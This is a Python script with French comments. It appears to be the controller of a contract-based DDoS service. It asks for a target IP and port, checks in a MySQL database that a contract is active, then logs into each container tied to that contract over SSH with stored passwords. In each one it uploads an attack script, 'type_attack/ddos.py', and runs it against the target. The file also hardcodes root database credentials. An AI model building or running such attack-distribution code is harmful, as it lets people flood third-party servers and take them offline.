#################################################
# pour vérifier que les connexion ssh ok         #
#   sudo apt install net-tools                  #
#   netstat -tuln | grep :<port>                #
#       exemple: netstat -tuln | grep :22*      #
#                                               #   
#################################################

# don't forget to install pymysql and paramiko
try:
    import pymysql
except ImportError:
    print("La bibliothèque pymysql est requise. Veuillez l'installer avec la commande suivante : pip install pymysql")

try:
    import paramiko
except ImportError:
    print("La bibliothèque paramiko est requise. Veuillez l'installer avec la commande suivante : pip install paramiko")


# Informations de connexion
DB_HOST = "mysql-container"  # Nom du conteneur ou IP
DB_PORT = 3306               # Port exposé par MySQL
DB_USER = "root"             # Utilisateur
DB_PASSWORD = "rootpassword" # Mot de passe
DB_NAME = "containers_db"    # Base de données


def connect_to_db():
    """Connexion à la base de données MySQL."""
    try:
        print(f"Tentative de connexion à la base de données {DB_NAME} sur {DB_HOST}:{DB_PORT}...")
        connection = pymysql.connect(
            host=DB_HOST,
            port=DB_PORT,
            user=DB_USER,
            password=DB_PASSWORD,
            database=DB_NAME
        )
        print("Connexion réussie à la base de données.")
        return connection
    except pymysql.MySQLError as e:
        print(f"Erreur lors de la connexion à la base de données : {e}")
        return None


def check_contract_status(contract_id: int) -> str:
    """Vérifie le statut d'un contrat."""
    connection = connect_to_db()
    if not connection:
        return None

    try:
        with connection.cursor() as cursor:
            sql_query = "SELECT status FROM contract WHERE contract_id = %s"
            cursor.execute(sql_query, (contract_id,))
            result = cursor.fetchone()

            if result:
                status = result[0]
                print(f"Statut du contrat {contract_id} : {status}")
                return status
            else:
                print(f"Aucun contrat trouvé avec l'ID {contract_id}.")
                return None
    finally:
        connection.close()


def get_containers_by_contract(contract_id):
    """Récupère les conteneurs associés à un contrat spécifique."""
    connection = connect_to_db()
    if not connection:
        return None

    try:
        with connection.cursor() as cursor:
            sql_query = """
            SELECT c.container_id, c.container_name, c.ssh_port, c.image, c.mdp_tmp
            FROM container c
            WHERE c.contract_id = %s;
            """
            cursor.execute(sql_query, (contract_id,))
            results = cursor.fetchall()

            if results:
                containers = []
                for result in results:
                    containers.append({
                        'container_id': result[0],
                        'container_name': result[1],
                        'ssh_port': result[2],
                        'image': result[3],
                        'mdp_tmp': result[4]
                    })
                print(f"Conteneurs liés au contrat {contract_id} : {containers}")
                return containers
            else:
                print(f"Aucun conteneur trouvé pour le contrat {contract_id}.")
                return None
    finally:
        connection.close()


def connect_ssh(container_info: dict, target_ip: str, target_port: int) -> None:
    """Établit une connexion SSH avec un conteneur et exécute une commande."""
    required_keys = ['container_id', 'container_name', 'ssh_port', 'mdp_tmp']
    if not all(key in container_info for key in required_keys):
        print("Erreur : Les informations du conteneur sont incomplètes.")
        return

    try:
        hostname = "192.168.179.128"
        port = container_info['ssh_port']
        username = "client1"
        password = container_info['mdp_tmp']

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        print(f"Connexion SSH en cours avec le conteneur {container_info['container_name']} sur le port {port}...")
        ssh.connect(hostname, port=port, username=username, password=password)

        print("Transfert du fichier ddos.py vers le conteneur...")
        sftp = ssh.open_sftp()
        sftp.put("type_attack/ddos.py", "/tmp/ddos.py")
        sftp.close()
        print("Fichier ddos.py transféré avec succès.")

        command = f"python3 /tmp/ddos.py {target_ip} {target_port}"
        stdin, stdout, stderr = ssh.exec_command(command)

        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()

        if output:
            print(f"Sortie de la commande : {output}")
        if error:
            print(f"Erreur de la commande : {error}")

        ssh.close()
        print(f"Connexion SSH terminée pour le conteneur {container_info['container_name']}.")
    except Exception as e:
        print(f"Erreur lors de la connexion SSH avec le conteneur {container_info['container_name']} : {e}")


def main():
    """Fonction principale pour gérer les contrats et exécuter les commandes."""
    try:
        contract_id = int(input("Entrez l'ID du contrat : "))
    except ValueError:
        print("Erreur : L'ID du contrat doit être un nombre entier.")
        return

    target_ip = input("Entrez l'adresse IP de la cible : ")
    try:
        target_port = int(input("Entrez le port de la cible : "))
    except ValueError:
        print("Erreur : Le port de la cible doit être un nombre entier.")
        return

    status = check_contract_status(contract_id)

    if status == "active":
        print("Le contrat est activé. Récupération des informations des conteneurs...")
        containers = get_containers_by_contract(contract_id)

        if containers:
            for container in containers:
                print(f"Traitement du conteneur : {container['container_name']}")
                connect_ssh(container, target_ip, target_port)
        else:
            print(f"Aucun conteneur actif trouvé pour le contrat {contract_id}.")
    else:
        print(f"Le contrat n'est pas actif. Statut : {status}.")


if __name__ == "__main__":
    main()
